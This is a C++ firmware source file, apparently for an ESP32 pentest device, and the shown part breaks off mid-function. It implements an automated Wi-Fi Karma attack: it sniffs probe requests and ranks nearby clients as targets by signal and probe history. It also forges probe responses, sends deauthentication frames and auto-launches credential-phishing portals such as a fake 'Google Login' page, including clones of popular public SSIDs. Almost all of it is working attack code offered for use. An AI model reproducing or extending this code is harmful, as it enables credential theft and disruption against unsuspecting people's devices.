/*
  Still not perfect, but a bit better. just improve it.
  Enhanced with tiered attack strategy, smart targeting, and clone network support
*/

#include "FS.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "driver/gpio.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "lwip/err.h"
#include "modules/wifi/evil_portal.h"
#include "nvs_flash.h"
#include <set>
#include <vector>
#include <map>
#include <algorithm>
#include "freertos/ringbuf.h"

#include "karma_attack.h"
#include "sniffer.h" // Channel list
#include <Arduino.h>
#include <TimeLib.h>
#include <globals.h>
#if defined(ESP32)
#include "FS.h"
#else
#include <SPI.h>
#include <SdFat.h>
#endif

//===== SETTINGS =====//
#define FILENAME "probe_capture_"
#define SAVE_INTERVAL 10              // save new file every 10s
#define MAX_PROBE_BUFFER 800          // Circular buffer size
#define MAC_CACHE_SIZE 300            // Ring buffer for MAC tracking
#define MAX_CLIENT_TRACK 100          // Maximum clients to track
#define FAST_HOP_INTERVAL 250         // Fast hopping for active scanning
#define DEFAULT_HOP_INTERVAL 5000     // Normal mode (5s)
#define DEAUTH_INTERVAL 30000         // Send deauth every 30s
#define VULNERABLE_THRESHOLD 3        // Client with 3+ SSIDs is vulnerable
#define AUTO_PORTAL_DELAY 2000        // Delay before auto-launching portal
#define SSID_FREQUENCY_RESET 30000    // Reset SSID frequency every 30s

const uint8_t priorityChannels[] = {1, 6, 11, 3, 8};
#define NUM_PRIORITY_CHANNELS 5

// Attack tiers for different strategies
enum AttackTier {
    TIER_NONE = 0,
    TIER_CLONE = 1,     // Clone popular networks (long duration)
    TIER_HIGH = 2,      // High-value targets (medium duration)
    TIER_MEDIUM = 3,    // Medium targets (short duration)
    TIER_FAST = 4       // Fast cycling for demos (very short)
};

// Portal template structure
struct PortalTemplate {
    String name;
    String filename;  // Empty for default templates
    bool isDefault;
    bool verifyPassword;
};

// Enhanced PendingPortal structure
struct PendingPortal {
    String ssid;
    uint8_t channel;
    String targetMAC;
    unsigned long timestamp;
    bool launched;
    String templateName;
    String templateFile;
    bool isDefaultTemplate;
    bool verifyPassword;
    uint8_t priority;      // 0-100 priority score
    AttackTier tier;       // Attack tier
    uint16_t duration;     // Portal duration in ms
    bool isCloneAttack;    // Is this a clone attack?
    uint16_t probeCount;   // How many times this SSID was probed
};

// Attack configuration
struct AttackConfig {
    AttackTier defaultTier = TIER_HIGH;
    uint32_t cloneDuration = 120000;    // 2 minutes for clone attacks
    uint16_t highTierDuration = 45000;  // 45 seconds for high priority
    uint16_t mediumTierDuration = 30000;// 30 seconds for medium
    uint16_t fastTierDuration = 15000;  // 15 seconds for fast mode
    uint8_t priorityThreshold = 60;     // Minimum priority to attack (0-100)
    uint8_t cloneThreshold = 5;         // Minimum probes to trigger clone attack
    uint8_t maxCloneNetworks = 2;       // Max clone networks to attack
    bool enableCloneMode = true;        // Enable clone network detection
    bool enableTieredAttack = true;     // Enable tiered attack strategy
    bool prioritizeByRSSI = true;       // Prioritize by signal strength
};

//===== Run-Time variables =====//
unsigned long last_time = 0;
unsigned long last_ChannelChange = 0;
unsigned long lastFrequencyReset = 0;
uint8_t channl = 0;
bool flOpen = false;
bool is_LittleFS = true;
uint32_t pkt_counter = 0;
bool auto_hopping = true;
uint16_t hop_interval = DEFAULT_HOP_INTERVAL;

File _probe_file;
RingbufHandle_t macRingBuffer;
String filen = "";

ProbeRequest probeBuffer[MAX_PROBE_BUFFER];
uint16_t probeBufferIndex = 0;
bool bufferWrapped = false;

std::map<String, ClientBehavior> clientBehaviors;
KarmaConfig karmaConfig;
AttackConfig attackConfig;

uint8_t channelActivity[14] = {0};
uint8_t currentPriorityChannel = 0;
unsigned long lastDeauthTime = 0;
unsigned long lastSaveTime = 0;

uint32_t totalProbes = 0;
uint32_t uniqueClients = 0;
uint32_t karmaResponsesSent = 0;
uint32_t deauthPacketsSent = 0;
uint32_t autoPortalsLaunched = 0;
uint32_t cloneAttacksLaunched = 0;
bool redrawNeeded = true;
bool isPortalActive = false;

// Portal templates
std::vector<PortalTemplate> portalTemplates;
PortalTemplate selectedTemplate;
bool templateSelected = false;

// SSID frequency tracking for clone attacks
std::map<String, uint16_t> ssidFrequency;
std::vector<std::pair<String, uint16_t>> popularSSIDs;

// Auto-portal launching
std::vector<PendingPortal> pendingPortals;
std::vector<PendingPortal> activePortals;

//===== FUNCTIONS =====//

String generateUniqueFilename(FS &fs, bool compressed) {
    String basePath = "/ProbeData/";
    String baseName = compressed ? "karma_compressed_" : "probe_capture_";
    String extension = compressed ? ".bin" : ".txt";

    if (!fs.exists(basePath)) { fs.mkdir(basePath); }

    int counter = 1;
    String filename;
    do {
        filename = basePath + baseName + String(counter) + extension;
        counter++;
    } while (fs.exists(filename));

    return filename;
}

void initMACCache() {
    macRingBuffer = xRingbufferCreate(MAC_CACHE_SIZE * 18, RINGBUF_TYPE_NOSPLIT);
    if (!macRingBuffer) {
        Serial.println("[ERROR] Failed to create MAC ring buffer!");
    }
}

bool isMACInCache(const String &mac) {
    if (!macRingBuffer) return false;

    size_t itemSize;
    char *item = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);

    while (item) {
        if (String(item) == mac) {
            vRingbufferReturnItem(macRingBuffer, item);
            return true;
        }
        vRingbufferReturnItem(macRingBuffer, item);
        item = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
    }
    return false;
}

void addMACToCache(const String &mac) {
    if (!macRingBuffer) return;

    if (xRingbufferGetCurFreeSize(macRingBuffer) < mac.length() + 1) {
        size_t itemSize;
        char *oldItem = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
        if (oldItem) {
            vRingbufferReturnItem(macRingBuffer, oldItem);
        }
    }

    xRingbufferSend(macRingBuffer, mac.c_str(), mac.length() + 1, pdMS_TO_TICKS(100));
}

bool isProbeRequestWithSSID(const wifi_promiscuous_pkt_t *packet) {
    if (!packet || packet->rx_ctrl.sig_len < 36) {
        return false;
    }

    const uint8_t *frame = packet->payload;
    uint8_t frameType = (frame[0] & 0x0C) >> 2;
    uint8_t frameSubType = (frame[0] & 0xF0) >> 4;

    if (frameType != 0x00 || frameSubType != 0x04) {
        return false;
    }

    uint8_t pos = 24;
    while (pos + 1 < packet->rx_ctrl.sig_len) {
        uint8_t tag = frame[pos];
        uint8_t len = frame[pos + 1];

        if (pos + 2 + len > packet->rx_ctrl.sig_len) {
            return false;
        }

        if (tag == 0x00 && len > 0 && len <= 32) {
            return true;
        }

        pos += 2 + len;
    }

    return false;
}

String extractSSID(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    int pos = 24;

    while (pos + 1 < packet->rx_ctrl.sig_len) {
        uint8_t tag = frame[pos];
        uint8_t len = frame[pos + 1];

        if (tag == 0x00 && len > 0 && len <= 32 && (pos + 2 + len <= packet->rx_ctrl.sig_len)) {
            bool hidden = true;
            bool printable = true;

            for (int i = 0; i < len; i++) {
                uint8_t c = frame[pos + 2 + i];
                if (c != 0x00) hidden = false;
                if (c < 32 || c > 126) printable = false;
            }

            if (hidden || !printable) {
                return "";
            }

            char ssid[len + 1];
            memcpy(ssid, &frame[pos + 2], len);
            ssid[len] = '\0';
            return String(ssid);
        }

        pos += 2 + len;
    }

    return "";
}

String extractMAC(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    char mac[18];
    snprintf(
        mac,
        sizeof(mac),
        "%02X:%02X:%02X:%02X:%02X:%02X",
        frame[10], frame[11], frame[12],
        frame[13], frame[14], frame[15]
    );
    return String(mac);
}

uint8_t extractEncryptionHint(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    int pos = 24;
    uint8_t encryptionHint = 0;

    while (pos + 1 < packet->rx_ctrl.sig_len) {
        uint8_t tag = frame[pos];
        uint8_t len = frame[pos + 1];

        if (tag == 0x01 && len >= 8) {
            for (int i = 0; i < len; i++) {
                uint8_t rate = frame[pos + 2 + i];
                if (rate == 0x30 || rate == 0x96) {
                    encryptionHint = 3;
                }
            }
        }

        pos += 2 + len;
    }

    return encryptionHint;
}

void analyzeClientBehavior(const ProbeRequest &probe) {
    auto it = clientBehaviors.find(probe.mac);

    if (it == clientBehaviors.end()) {
        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) {
            String oldestMAC;
            uint32_t oldestTime = UINT32_MAX;

            for (const auto &clientPair : clientBehaviors) {
                if (clientPair.second.lastSeen < oldestTime) {
                    oldestTime = clientPair.second.lastSeen;
                    oldestMAC = clientPair.first;
                }
            }

            if (!oldestMAC.isEmpty()) {
                clientBehaviors.erase(oldestMAC);
            }
        }

        ClientBehavior behavior;
        behavior.mac = probe.mac;
        behavior.firstSeen = probe.timestamp;
        behavior.lastSeen = probe.timestamp;
        behavior.probeCount = 1;
        behavior.avgRSSI = probe.rssi;
        behavior.probedSSIDs.push_back(probe.ssid);
        behavior.favoriteChannel = probe.channel;
        behavior.lastKarmaAttempt = 0;
        behavior.isVulnerable = (probe.ssid.length() > 0);

        clientBehaviors[probe.mac] = behavior;
        uniqueClients++;

    } else {
        ClientBehavior &behavior = it->second;
        behavior.lastSeen = probe.timestamp;
        behavior.probeCount++;
        behavior.avgRSSI = (behavior.avgRSSI + probe.rssi) / 2;

        if (probe.channel >= 1 && probe.channel <= 14) {
            channelActivity[probe.channel - 1]++;
            if (channelActivity[probe.channel - 1] > channelActivity[behavior.favoriteChannel - 1]) {
                behavior.favoriteChannel = probe.channel;
            }
        }

        bool ssidExists = false;
        for (const auto &existingSSID : behavior.probedSSIDs) {
            if (existingSSID == probe.ssid) {
                ssidExists = true;
                break;
            }
        }

        if (!ssidExists && probe.ssid.length() > 0) {
            behavior.probedSSIDs.push_back(probe.ssid);

            if (behavior.probedSSIDs.size() >= VULNERABLE_THRESHOLD) {
                behavior.isVulnerable = true;
            }
        }
    }
}

// Calculate attack priority score (0-100)
uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe) {
    uint8_t score = 0;

    // 1. Signal strength (RSSI) - 30 points max
    if (probe.rssi > -50) score += 30;          // Excellent signal
    else if (probe.rssi > -65) score += 20;     // Good signal
    else if (probe.rssi > -75) score += 10;     // Fair signal

    // 2. Probe frequency - 25 points max
    if (client.probeCount > 10) score += 25;    // Very active
    else if (client.probeCount > 5) score += 15;// Active
    else if (client.probeCount > 2) score += 5; // Somewhat active

    // 3. Vulnerability - 20 points max
    if (client.isVulnerable) score += 20;       // Known vulnerable

    // 4. Recency - 15 points max
    unsigned long sinceLast = millis() - client.lastSeen;
    if (sinceLast < 5000) score += 15;          // Very recent
    else if (sinceLast < 15000) score += 10;    // Recent
    else if (sinceLast < 30000) score += 5;     // Somewhat recent

    // 5. SSID popularity - 10 points max
    String ssidLower = probe.ssid;
    ssidLower.toLowerCase();
    if (ssidLower.indexOf("starbucks") != -1 ||
        ssidLower.indexOf("xfinity") != -1 ||
        ssidLower.indexOf("att") != -1 ||
        ssidLower.indexOf("spectrum") != -1 ||
        ssidLower.indexOf("comcast") != -1 ||
        ssidLower.indexOf("tmobile") != -1) {
        score += 10; // Common/public SSID
    }

    return min(score, (uint8_t)100);
}

// Determine attack tier based on priority score
AttackTier determineAttackTier(uint8_t priority) {
    if (priority >= 80) return TIER_HIGH;
    if (priority >= 60) return TIER_MEDIUM;
    if (priority >= 40) return TIER_FAST;
    return TIER_NONE;
}

// Get portal duration based on tier
uint16_t getPortalDuration(AttackTier tier) {
    switch(tier) {
        case TIER_CLONE: return (uint16_t)attackConfig.cloneDuration;
        case TIER_HIGH: return attackConfig.highTierDuration;
        case TIER_MEDIUM: return attackConfig.mediumTierDuration;
        case TIER_FAST: return attackConfig.fastTierDuration;
        default: return attackConfig.mediumTierDuration;
    }
}

void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
    if (ssid.isEmpty() || mac.isEmpty()) return;

    uint8_t probeResponse[128] = {0};
    uint8_t pos = 0;

    probeResponse[pos++] = 0x50;
    probeResponse[pos++] = 0x00;

    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;

    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &probeResponse[pos], &probeResponse[pos+1], &probeResponse[pos+2],
           &probeResponse[pos+3], &probeResponse[pos+4], &probeResponse[pos+5]);
    pos += 6;

    static uint8_t fakeMAC[6] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};
    memcpy(&probeResponse[pos], fakeMAC, 6);
    pos += 6;

    memcpy(&probeResponse[pos], fakeMAC, 6);
    pos += 6;

    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;

    for (int i = 0; i < 8; i++) probeResponse[pos++] = 0x00;

    probeResponse[pos++] = 0x64;
    probeResponse[pos++] = 0x00;

    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = 0x04;

    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = ssid.length();
    memcpy(&probeResponse[pos], ssid.c_str(), ssid.length());
    pos += ssid.length();

    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = sizeof(rates);
    memcpy(&probeResponse[pos], rates, sizeof(rates));
    pos += sizeof(rates);

    probeResponse[pos++] = 0x03;
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = channel;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, probeResponse, pos, false);

    if (err == ESP_OK) {
        karmaResponsesSent++;
        Serial.printf("[KARMA] Sent probe response for %s to %s on ch%d\n", 
                     ssid.c_str(), mac.c_str(), channel);
    }
}

void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
    if (!karmaConfig.enableDeauth) return;

    uint8_t deauthPacket[26] = {0};

    deauthPacket[0] = 0xC0;
    deauthPacket[1] = 0x00;

    if (broadcast) {
        memset(&deauthPacket[2], 0xFF, 6);
    } else {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &deauthPacket[2], &deauthPacket[3], &deauthPacket[4],
               &deauthPacket[5], &deauthPacket[6], &deauthPacket[7]);
    }

    uint8_t fakeMAC[] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};
    memcpy(&deauthPacket[8], fakeMAC, 6);
    memcpy(&deauthPacket[14], fakeMAC, 6);

    deauthPacket[20] = 0x00;
    deauthPacket[21] = 0x00;
    deauthPacket[22] = 0x01;
    deauthPacket[23] = 0x00;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 24, false);

    deauthPacketsSent++;
}

void smartChannelHop() {
    if (!auto_hopping) return;

    unsigned long now = millis();
    if (now - last_ChannelChange < hop_interval) return;

    if (channelActivity[channl] > 20) {
        hop_interval = DEFAULT_HOP_INTERVAL * 3;
        return;
    }

    currentPriorityChannel = (currentPriorityChannel + 1) % NUM_PRIORITY_CHANNELS;
    channl = priorityChannels[currentPriorityChannel] - 1;

    esp_wifi_set_promiscuous(false);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(priorityChannels[currentPriorityChannel], secondCh);
    delay(50);
    esp_wifi_set_promiscuous(true);

    last_ChannelChange = now;
    redrawNeeded = true;
    hop_interval = DEFAULT_HOP_INTERVAL;

    Serial.printf("[CHANNEL] Switched to channel %d\n", priorityChannels[currentPriorityChannel]);
}

void updateChannelActivity(uint8_t channel) {
    if (channel >= 1 && channel <= 14) {
        channelActivity[channel - 1]++;
    }
}

uint8_t getBestChannel() {
    uint8_t best = 1;
    uint16_t maxActivity = 0;

    for (int i = 0; i < 14; i++) {
        if (channelActivity[i] > maxActivity) {
            maxActivity = channelActivity[i];
            best = i + 1;
        }
    }

    return best;
}

// Track SSID frequency for clone attacks
void updateSSIDFrequency(const String &ssid) {
    if (ssid.isEmpty()) return;

    ssidFrequency[ssid]++;

    // Update popular SSIDs list
    static unsigned long lastSort = 0;
    if (millis() - lastSort > 5000) { // Sort every 5 seconds
        lastSort = millis();

        popularSSIDs.clear();
        for (const auto &pair : ssidFrequency) {
            popularSSIDs.push_back(pair);
        }

        // Sort by frequency (descending)
        std::sort(popularSSIDs.begin(), popularSSIDs.end(),
            [](const auto &a, const auto &b) { return a.second > b.second; });
    }
}

// Check for clone attack opportunities
void checkCloneAttackOpportunities() {
    if (!attackConfig.enableCloneMode || popularSSIDs.empty()) return;

    // Check if we should reset frequency tracking
    if (millis() - lastFrequencyReset > SSID_FREQUENCY_RESET) {
        ssidFrequency.clear();
        popularSSIDs.clear();
        lastFrequencyReset = millis();
        return;
    }

    // Check top SSIDs for clone attack
    size_t maxNetworks = std::min((size_t)attackConfig.maxCloneNetworks, popularSSIDs.size());
    for (size_t i = 0; i < maxNetworks; i++) {
        const auto &ssidPair = popularSSIDs[i];

        if (ssidPair.second >= attackConfig.cloneThreshold) {
            // Check if we're already attacking this SSID
            bool alreadyAttacking = false;
            for (const auto &portal : pendingPortals) {
                if (portal.ssid == ssidPair.first && portal.isCloneAttack) {
                    alreadyAttacking = true;
                    break;
                }
            }

            if (!alreadyAttacking) {
                PendingPortal portal;
                portal.ssid = ssidPair.first;
                portal.channel = getBestChannel();
                portal.timestamp = millis();
                portal.launched = false;
                portal.templateName = selectedTemplate.name;
                portal.templateFile = selectedTemplate.filename;
                portal.isDefaultTemplate = selectedTemplate.isDefault;
                portal.verifyPassword = selectedTemplate.verifyPassword;
                portal.priority = 100; // Max priority for clone attacks
                portal.tier = TIER_CLONE;
                portal.duration = (uint16_t)attackConfig.cloneDuration;
                portal.isCloneAttack = true;
                portal.probeCount = ssidPair.second;

                pendingPortals.push_back(portal);

                Serial.printf("[CLONE] Scheduled clone attack for %s (%d probes)\n",
                            ssidPair.first.c_str(), ssidPair.second);
            }
        }
    }
}

// Load portal templates from filesystem
void loadPortalTemplates() {
    portalTemplates.clear();

    // Add default templates
    portalTemplates.push_back({"Google Login", "", true, false});
    portalTemplates.push_back({"Router Update", "", true, true});

    // Load custom templates from LittleFS
    if (LittleFS.begin()) {
        if (LittleFS.exists("/PortalTemplates")) {
            File root = LittleFS.open("/PortalTemplates");
            File file = root.openNextFile();

            while (file) {
                if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
                    PortalTemplate tmpl;
                    tmpl.name = String(file.name());
                    tmpl.name.replace(".html", "");
                    tmpl.filename = "/PortalTemplates/" + String(file.name());
                    tmpl.isDefault = false;
                    tmpl.verifyPassword = false;

                    // Check if template has verification hint in first line
                    String firstLine = file.readStringUntil('\n');
                    if (firstLine.indexOf("verify=\"true\"") != -1) {
                        tmpl.verifyPassword = true;
                    }

                    portalTemplates.push_back(tmpl);
                    Serial.printf("[TEMPLATE] Loaded custom: %s\n", tmpl.name.c_str());
                }
                file = root.openNextFile();
            }
        }
        LittleFS.end();
    }

    // Load custom templates from SD card
    if (SD.begin()) {
        if (SD.exists("/PortalTemplates")) {
            File root = SD.open("/PortalTemplates");
            File file = root.openNextFile();

            while (file) {
                if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
                    PortalTemplate tmpl;
                    tmpl.name = "[SD] " + String(file.name());
                    tmpl.name.replace(".html", "");
                    tmpl.filename = "/PortalTemplates/" + String(file.name());
                    tmpl.isDefault = false;
                    tmpl.verifyPassword = false;

                    String firstLine = file.readStringUntil('\n');
                    if (firstLine.indexOf("verify=\"true\"") != -1) {
                        tmpl.verifyPassword = true;
                    }

                    portalTemplates.push_back(tmpl);
                    Serial.printf("[TEMPLATE] Loaded SD: %s\n", tmpl.name.c_str());
                }
                file = root.openNextFile();
            }
        }
        SD.end();
    }
}

// Show template selection menu at startup
bool selectPortalTemplate() {
    loadPortalTemplates();

    if (portalTemplates.empty()) {
        displayTextLine("No templates found!");
        delay(2000);
        return false;
    }

    drawMainBorderWithTitle("SELECT TEMPLATE");

    std::vector<Option> templateOptions;

    for (const auto &tmpl : portalTemplates) {
        String displayName = tmpl.name;
        if (tmpl.isDefault) displayName = "[D] " + displayName;
        if (tmpl.verifyPassword) displayName += " (verify)";

        templateOptions.push_back({displayName.c_str(), [=, &tmpl]() {
            selectedTemplate = tmpl;
            templateSelected = true;

            drawMainBorderWithTitle("KARMA SETUP");
            displayTextLine("Selected: " + tmpl.name);
            delay(1000);
        }});
    }

    templateOptions.push_back({"Skip (No Portal)", [=]() {
        karmaConfig.enableAutoPortal = false;
        templateSelected = false;
        drawMainBorderWithTitle("KARMA SETUP");
        displayTextLine("Auto-portal disabled");
        delay(1000);
    }});

    templateOptions.push_back({"Reload Templates", [=]() {
        loadPortalTemplates();
        returnToMenu = false;
        selectPortalTemplate();
    }});

    loopOptions(templateOptions);

    return templateSelected;
}

// Launch Evil Portal with timeout based on tier
void launchTieredEvilPortal(PendingPortal &portal) {
    Serial.printf("[TIER-%d] Launching portal for %s (Duration: %ds)\n", 
                 portal.tier, portal.ssid.c_str(), portal.duration / 1000);

    isPortalActive = true;

    // Clean shutdown WiFi
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(500);

    // Launch Evil Portal with autoMode=true to skip menu
    EvilPortal portalInstance(portal.ssid, portal.channel, 
                            karmaConfig.enableDeauth, portal.verifyPassword, true);

    // Track portal start time
    unsigned long portalStart = millis();
    bool portalExited = false;

    // Monitor portal with timeout
    while (millis() - portalStart < portal.duration) {
        // Check for early exit
        if (check(EscPress)) {
            Serial.println("[PORTAL] Early exit requested");
            break;
        }

        // Check if portal is still running (you'd need EvilPortal to expose status)
        // For now, we'll just wait the duration

        delay(100);
    }

    // Force exit if still running
    Serial.printf("[PORTAL] Timeout reached (%ds), restarting karma...\n", portal.duration / 1000);

    isPortalActive = false;

    if (portal.isCloneAttack) {
        cloneAttacksLaunched++;
    } else {
        autoPortalsLaunched++;
    }

    // Restart karma sniffer
    karma_setup();
}

// Check and launch pending portals with tiered strategy
void executeTieredAttackStrategy() {
    if (pendingPortals.empty() || !templateSelected || isPortalActive) return;

    // Sort portals by priority (highest first)
    std::sort(pendingPortals.begin(), pendingPortals.end(),
        [](const PendingPortal &a, const PendingPortal &b) {
            if (a.isCloneAttack && !b.isCloneAttack) return true;
            if (!a.isCloneAttack && b.isCloneAttack) return false;
            return a.priority > b.priority;
        });

    // Execute attack based on tier
    if (attackConfig.enableTieredAttack) {
        // 1. Clone attacks first (highest priority)
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->isCloneAttack && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return; // One attack at a time
            } else {
                ++it;
            }
        }

        // 2. High tier individual attacks
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->tier == TIER_HIGH && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else {
                ++it;
            }
        }

        // 3. Medium tier (can batch multiple)
        std::vector<PendingPortal> mediumTargets;
        for (const auto &portal : pendingPortals) {
            if (portal.tier == TIER_MEDIUM && !portal.launched) {
                mediumTargets.push_back(portal);
                if (mediumTargets.size() >= 2) break; // Batch 2 medium targets
            }
        }

        if (!mediumTargets.empty()) {
            // Attack first medium target
            for (auto &target : mediumTargets) {
                for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ++it) {
                    if (it->ssid == target.ssid && it->targetMAC == target.targetMAC) {
                        launchTieredEvilPortal(*it);
                        it->launched = true;
                        pendingPortals.erase(it);
                        return;
                    }
                }
            }
        }

        // 4. Fast tier (quick attacks, lower chance)
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->tier == TIER_FAST && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else {
                ++it;
            }
        }
    } else {
        // Simple FIFO strategy
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (!it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else {
                ++it;
            }
        }
    }
}

// Check pending portals and execute attacks
void checkPendingPortals() {
    if (pendingPortals.empty() || !templateSelected || isPortalActive) return;

    // Remove old pending portals (> 5 minutes)
    unsigned long now = millis();
    pendingPortals.erase(
        std::remove_if(pendingPortals.begin(), pendingPortals.end(),
            [now](const PendingPortal &p) {
                return (now - p.timestamp > 300000); // 5 minutes
            }),
        pendingPortals.end()
    );

    // Execute tiered attack strategy
    executeTieredAttackStrategy();
}

// Launch Evil Portal for manual mode (shows menu)
void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd) {
    Serial.printf("[MANUAL] Launching Evil Portal for %s (ch%d)\n", ssid.c_str(), channel);

    isPortalActive = true;

    // Clean shutdown WiFi
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(500);

    // Launch Evil Portal with autoMode=false to show menu
    EvilPortal portalInstance(ssid, channel, karmaConfig.enableDeauth, verifyPwd, false);

    isPortalActive = false;

    // After portal exits, restart karma sniffer
    Serial.println("[MANUAL] Portal closed, restarting karma...");
    karma_setup();
}

void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

    if (isProbeRequestWithSSID(pkt)) {
        String mac = extractMAC(pkt);
        String ssid = extractSSID(pkt);

        if (ssid.isEmpty() || mac.isEmpty()) return;

        String cacheKey = mac + ":" + ssid;
        if (isMACInCache(cacheKey)) return;
        addMACToCache(cacheKey);

        ProbeRequest probe;
        probe.mac = mac;
        probe.ssid = ssid;
        probe.rssi = ctrl.rssi;
        probe.timestamp = millis();
        probe.channel = all_wifi_channels[channl];
        probe.encryption_type = extractEncryptionHint(pkt);

        probeBuffer[probeBufferIndex] = probe;
        probeBufferIndex = (probeBufferIndex + 1) % MAX_PROBE_BUFFER;
        if (probeBufferIndex == 0) bufferWrapped = true;

        totalProbes++;
        pkt_counter++;
        analyzeClientBehavior(probe);
        updateChannelActivity(probe.channel);
        updateSSIDFrequency(probe.ssid);

        if (karmaConfig.enableAutoKarma) {
            auto it = clientBehaviors.find(probe.mac);
            if (it != clientBehaviors.end()) {
                ClientBehavior &client = it->second;

                // Calculate attack priority
                uint8_t priority = calculateAttackPriority(client, probe);

                // Only attack if above threshold and cooldown expired
                if (priority >= attackConfig.priorityThreshold) {
                    if (millis() - client.lastKarmaAttempt > 60000) { // 1 minute cooldown
                        sendProbeResponse(probe.ssid, probe.mac, probe.channel);
                        client.lastKarmaAttempt = millis();

                        // Schedule portal based on priority
                        AttackTier tier = determineAttackTier(priority);

                        if (tier != TIER_NONE) {
                            PendingPortal portal;
                            portal.ssid = probe.ssid;
                            portal.channel = probe.channel;
                            portal.targetMAC = probe.mac;
                            portal.timestamp = millis();
                            portal.launched = false;
                            portal.templateName = selectedTemplate.name;
                            portal.templateFile = selectedTemplate.filename;
                            portal.isDefaultTemplate = selectedTemplate.isDefault;
                            portal.verifyPassword = selectedTemplate.verifyPassword;
                            portal.priority = priority;
                            portal.tier = tier;
                            portal.duration = getPortalDuration(tier);
                            portal.isCloneAttack = false;
                            portal.probeCount = 1;

                            pendingPortals.push_back(portal);

                            Serial.printf("[SCHEDULE] Tier %d attack for %s (Priority: %d)\n",
                                        tier, probe.ssid.c_str(), priority);
                        }
                    }
                }
            }
        }

        Serial.printf("[PROBE] %s -> %s (RSSI:%d, ch:%d)\n", 
                     mac.c_str(), ssid.c_str(), ctrl.rssi, probe.channel);
    }
}

void clearProbes() {
    probeBufferIndex = 0;
    bufferWrapped = false;
    totalProbes = 0;
    uniqueClients = 0;
    pkt_counter = 0;
    karmaResponsesSent = 0;
    deauthPacketsSent = 0;
    autoPortalsLaunched = 0;
    cloneAttacksLaunched = 0;
    pendingPortals.clear();
    activePortals.clear();
    ssidFrequency.clear();
    popularSSIDs.clear();

    memset(channelActivity, 0, sizeof(channelActivity));
    clientBehaviors.clear();

    if (macRingBuffer) {
        vRingbufferDelete(macRingBuffer);
        initMACCache();
    }

    Serial.println("[KARMA] All data cleared");
}

std::vector<ProbeRequest> getUniqueProbes() {
    std::vector<ProbeRequest> unique;
    std::set<String> seen;

    int start = bufferWrapped ? probeBufferIndex : 0;
    int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;

    for (int i = 0; i < count; i++) {
        int idx = (start + i) % MAX_PROBE_BUFFER;
        const ProbeRequest &probe = probeBuffer[idx];
        String key = probe.mac + ":" + probe.ssid;

        if (seen.find(key) == seen.end()) {
            seen.insert(key);
            unique.push_back(probe);
        }
    }

    return unique;
}

std::vector<ClientBehavior> getVulnerableClients() {
    std::vector<ClientBehavior> vulnerable;

    for (const auto &pair : clientBehaviors) {
        if (pair.second.isVulnerable) {
            vulnerable.push_back(pair.second);
        }
    }

    return vulnerable;
}

void updateKarmaDisplay() {
    unsigned long currentTime = millis();

    if (currentTime - last_time > 1000) {
        last_time = currentTime;

        tft.fillRect(10, tftHeight - 80, tftWidth - 20, 70, bruceConfig.bgColor);

        tft.setTextSize(1);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

        // Left column
        tft.setCursor(10, tftHeight - 75);
        tft.print("Total: " + String(totalProbes));

        tft.setCursor(10, tftHeight - 65);
        tft.print("Unique: " + String(uniqueClients));

        tft.setCursor(10, tftHeight - 55);
